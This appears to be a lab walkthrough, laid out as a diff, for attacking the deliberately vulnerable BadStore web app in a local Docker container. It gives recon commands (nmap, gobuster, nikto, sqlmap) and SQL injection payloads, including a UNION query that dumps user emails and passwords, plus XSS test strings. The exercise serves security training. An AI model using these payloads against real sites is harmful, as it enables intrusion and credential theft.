@@ -1,0 +1,95 @@
+BADSTORE:
+========================================================================================
+Step 1: Setup the Environment
+=======================================================================================
+1.1 Install Docker (if not installed)
+sudo apt update
+sudo apt install docker.io -y
+sudo systemctl start docker
+-sudo systemctl enable docker
+-----------------------------------------------------------------------
+1.2 Run BadStore Container
+Pull and run the BadStore app using this Docker image:
+-sudo docker pull ghcr.io/jvhoof/badstore-docker:main
+-sudo docker run -d -p 8080:80 --name badstore ghcr.io/jvhoof/badstore-docker:main
+---------------------------------------------------------------------------------------
+1.3 Verify BadStore is Running
+Check running containers:
+-sudo docker ps
+Test BadStore app is up by opening in browser:
+-http://localhost:8080
+Or 
+use curl:
+-curl -I http://localhost:8080/cgi-bin/badstore.cgi
+==============================================================================================
+Step 2: Information Gathering
+----------------------------------------------------------------------------------------
+2.1 Identify Web Server and Tech Stack
+-whatweb http://localhost:8080
+---------------------------------------------------------------------------------------
+2.2 Discover Hidden Directories and Files
+-gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt
+---------------------------------------------------------------------------------------
+2.3 Scan Open Ports and Services
+-nmap -sV -Pn localhost
+--------------------------------------------------------------------------------------
+2.4 Check for Outdated Software and Misconfigurations
+-nikto -h http://localhost:8080
+--------------------------------------------------------------------------------------
+2.5 Enumerate Databases Using SQL Injection Tool
+-sqlmap -u "http://localhost:8080/cgi-bin/badstore.cgi?action=search&searchquery=test" --dbs
+==================================================================================================
+ Step3: Identify Vulnerabilities in BadStore
+----------------------------------------------------------------------------------------------
+1. SQL Injection (SQLi) Vulnerability
+
+Open the search page on BadStore:
+-http://localhost:8080/cgi-bin/badstore.cgi?action=search
+In the search input, enter a common SQL injection test payload:
+-1' OR '1'='1
+Alternatively, paste this entire URL in browser:
+-http://localhost:8080/cgi-bin/badstore.cgi?action=search&searchquery=1' OR '1'='1
+or use in kali linux
+-sqlmap -u "http://localhost:8080/cgi-bin/badstore.cgi?action=search&searchquery=1" --batch --dbs
+----------------------------------------------------------------------------------------------------------
+2. Cross-Site Scripting (XSS)
+
+Enter this payload into the search box on BadStore:
+<script>alert('XSS')</script>
+If a popup alert appears, the application is vulnerable to stored or reflected XSS.
+------------------------------------------------------------------------------------------------------
+3. Information Disclosure
+
+a.Use Nikto to scan for common misconfigurations and info leaks:
+-nikto -h http://localhost:8080
+b.Manually try invalid URLs or input unexpected data and observe error messages.
+c.Use curl to view headers that may leak software versions:
+-curl -I http://localhost:8080
+-------------------------------------------------------------------------------------------------------
+4. Outdated Software Vulnerabilities
+-whatweb http://localhost:8080
+-nikto -h http://localhost:8080
+===========================================================================================================
+Step 4: Exploitation / Payloads
+-----------------------------------------------------------------------------------------------------
+4.1 SQL Injection to Retrieve All Products
+Open in browser:
+-http://localhost:8080/cgi-bin/badstore.cgi?action=search&searchquery=1' OR '1'='1
+----------------------------------------------------------------------------------------------
+4.2 SQL Injection to Dump User Emails and Passwords
+Open in browser:
+-http://localhost:8080/cgi-bin/badstore.cgi?searchquery=xx'+IN+(itemnum,sdesc,ldesc)+union+select+email,passwd,123,123+from+userdb+LIMIT+2+--+&action=search
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+4.3 SQL Injection to Count Items in Database
+Open in browser:
+-http://localhost:8080/cgi-bin/badstore.cgi?searchquery=x'+union+select+count(itemnum),count(itemnum),count(itemnum),count(itemnum)+from+itemdb+--+&action=search
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+4.4 Cross-Site Scripting (XSS) Payload
+In search input, enter:
+-<script>alert(100)</script>
+====================================================================================================================================
+Step 5: Cleanup
+----------------------------------------------------------------------------------------------------------------
+To stop and remove the container after testing:
+sudo docker stop badstore
+sudo docker rm badstore
